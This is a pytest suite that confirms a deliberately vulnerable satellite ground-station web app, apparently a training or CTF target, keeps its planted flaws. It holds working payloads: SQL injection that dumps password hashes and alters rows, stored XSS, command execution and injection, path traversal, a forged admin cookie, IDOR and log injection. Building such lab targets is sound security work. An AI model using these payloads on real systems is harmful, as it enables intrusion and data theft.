"""End-to-end validation of all 12 ground station vulnerabilities."""

import base64
import os
import tempfile

import pytest

from webapp.config import TestConfig
from webapp.db import get_db, init_db
from webapp.seed import seed_db


@pytest.fixture
def app():
    from webapp.app import create_app

    db_fd, db_path = tempfile.mkstemp(suffix=".db")
    app = create_app(TestConfig, db_path=db_path)
    with app.app_context():
        init_db()
        seed_db()
        yield app
    os.close(db_fd)
    os.unlink(db_path)


@pytest.fixture
def client(app):
    return app.test_client()


@pytest.fixture
def operator(client):
    client.post("/login", data={"username": "operator", "password": "operator123"})
    return client


class TestGS01_SQLi:
    def test_extract_admin_hash(self, operator):
        resp = operator.get(
            "/api/telemetry?search=' UNION SELECT 1,username,password_hash,role,5,6,7,8,9,10,11 FROM users--&limit=100"
        )
        assert resp.status_code == 200
        data = str(resp.get_json())
        assert "5f4dcc3b" in data


class TestGS02_XSS:
    def test_stored_xss(self, app, operator):
        with app.app_context():
            db = get_db()
            db.execute(
                "INSERT INTO logs (timestamp, level, source, message) VALUES (?,?,?,?)",
                ("2026-04-09", "INFO", "xss", '<img src=x onerror="alert(1)">'),
            )
            db.commit()
        resp = operator.get("/logs")
        assert b'<img src=x onerror="alert(1)">' in resp.data


class TestGS03_RCE:
    def test_rce(self, operator):
        resp = operator.post("/api/diagnostics", json={"cmd": "echo GS03_FLAG"}, content_type="application/json")
        assert "GS03_FLAG" in resp.get_json()["output"]


class TestGS04_LFI:
    def test_path_traversal(self, operator):
        resp = operator.get("/api/logs?file=../../../../../../../etc/hostname")
        assert resp.status_code == 200


class TestGS05_AuthBypass:
    def test_forge_admin(self, client):
        token = base64.b64encode(b"admin:admin:0").decode()
        client.set_cookie("session_token", token)
        resp = client.get("/dashboard")
        assert resp.status_code == 200
        assert b"admin" in resp.data


class TestGS06_IDOR:
    def test_read_admin_config(self, operator):
        resp = operator.get("/api/config/radio/1")
        assert resp.get_json()["owner"] == "admin"


class TestGS07_CMDI:
    def test_command_injection(self, operator):
        resp = operator.post("/api/config/radio", json={"frequency": "1; echo GS07"}, content_type="application/json")
        assert "GS07" in resp.get_json()["output"]


class TestGS08_KillChain:
    def test_radio_send(self, operator):
        resp = operator.post("/api/radio/send", json={"data": "080100"}, content_type="application/json")
        assert resp.status_code == 200


class TestGS09_DBTamper:
    def test_update_via_sqli(self, operator):
        resp = operator.get("/api/telemetry?search='; UPDATE telemetry SET temperature=999 WHERE id=1;--&limit=1")
        assert resp.status_code in (200, 500)


class TestGS11_LogInjection:
    def test_newline_injection(self, operator):
        resp = operator.post(
            "/api/logs", json={"message": "line1\nFAKE: admin authorized"}, content_type="application/json"
        )
        assert resp.status_code == 200


class TestGS12_APIEnum:
    def test_no_auth_required(self, client):
        resp = client.get("/api/endpoints")
        assert resp.status_code == 200
        routes = [r["rule"] for r in resp.get_json()]
        assert "/api/diagnostics" in routes
